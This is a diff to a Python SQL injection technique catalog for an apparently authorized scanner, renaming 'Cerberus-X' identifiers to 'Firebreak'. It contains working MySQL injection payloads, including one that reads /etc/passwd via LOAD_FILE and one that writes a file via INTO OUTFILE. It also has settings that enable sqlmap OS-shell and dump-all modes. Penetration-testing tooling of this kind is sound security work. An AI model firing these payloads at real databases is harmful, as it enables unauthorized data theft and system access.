@@ -2,7 +2,7 @@
 SQL injection technique catalog and sqlmap strategy (authorized testing).
 
 Maps classic in-band, OOB, DB-specific, blind, evasion, and exfil techniques
-onto sqlmap flags and lightweight probe payloads used by Cerberus-X scanners.
+onto sqlmap flags and lightweight probe payloads used by Firebreak scanners.
 Does not ship standalone exploit PoCs — execution goes through sqlmap / probes.
 """
 
@@ -70,7 +70,7 @@ MYSQL_PAYLOADS = [
     "' AND BENCHMARK(2000000,MD5(1))-- ",
     "' UNION SELECT NULL,table_name FROM information_schema.tables-- ",
     "' AND LOAD_FILE('/etc/passwd')-- ",
-    "' INTO OUTFILE '/tmp/cerberus_out.txt'-- ",
+    "' INTO OUTFILE '/tmp/firebreak_out.txt'-- ",
     "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(user())) USING utf8)))-- ",
     "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
 ]
@@ -325,14 +325,14 @@ def sqli_profile(
             "schema": True,
             "second_order": True,
             "file_read_probe": True,
-            "os_shell": os.environ.get("CERBERUS_SQLMAP_OS_SHELL", "").lower()
+            "os_shell": os.environ.get("FIREBREAK_SQLMAP_OS_SHELL", "").lower()
             in {"1", "true", "yes", "on"},
         },
     }
     profile = dict(profiles.get(normalized, profiles["aggressive"]))
     profile["intensity"] = normalized if normalized in profiles else "aggressive"
     profile["dbms"] = dbms
-    if os.environ.get("CERBERUS_SQLMAP_DUMP_ALL", "").lower() in {
+    if os.environ.get("FIREBREAK_SQLMAP_DUMP_ALL", "").lower() in {
         "1",
         "true",
         "yes",
@@ -348,11 +348,11 @@ def _has_flag(args: Sequence[str], name: str) -> bool:
 
 
 def _dns_domain() -> Optional[str]:
-    return (os.environ.get("CERBERUS_SQLMAP_DNS_DOMAIN") or "").strip() or None
+    return (os.environ.get("FIREBREAK_SQLMAP_DNS_DOMAIN") or "").strip() or None
 
 
 def _second_order_url() -> Optional[str]:
-    return (os.environ.get("CERBERUS_SQLMAP_SECOND_ORDER") or "").strip() or None
+    return (os.environ.get("FIREBREAK_SQLMAP_SECOND_ORDER") or "").strip() or None
 
 
 def build_sqlmap_args(
@@ -513,7 +513,7 @@ def follow_on_sqlmap_actions(
 
 def resolve_sqli_intensity(evasion: Optional[Dict[str, Any]] = None) -> str:
     """Map WAF evasion level / env to SQLi intensity."""
-    env = (os.environ.get("CERBERUS_SQLI_INTENSITY") or "").strip().lower()
+    env = (os.environ.get("FIREBREAK_SQLI_INTENSITY") or "").strip().lower()
     if env:
         return env
     evasion = evasion or {}
